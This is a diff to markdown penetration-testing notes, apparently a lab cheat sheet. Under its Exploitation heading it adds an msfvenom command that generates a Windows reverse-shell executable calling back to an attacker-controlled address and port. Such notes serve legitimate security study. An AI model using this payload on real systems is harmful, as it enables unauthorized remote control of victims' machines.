@@ -24,7 +24,10 @@ For background the DNS Querying Service is running nslookup and then querying th
 
 
 ## Exploitation <img src="https://cdn-icons-png.flaticon.com/512/2147/2147286.png" width="40" height="40" /> 
- 
+### MSFVENOM
+````
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.49.140 LPORT=445 -f exe -o ~/shell.exe
+````
 ## Buffer Overflow <img src="https://w7.pngwing.com/pngs/331/576/png-transparent-computer-icons-stack-overflow-encapsulated-postscript-stacking-angle-text-stack-thumbnail.png" width="40" height="40" />
 
 ## File Transfer <img src="https://cdn-icons-png.flaticon.com/512/1037/1037316.png" width="40" height="40" />
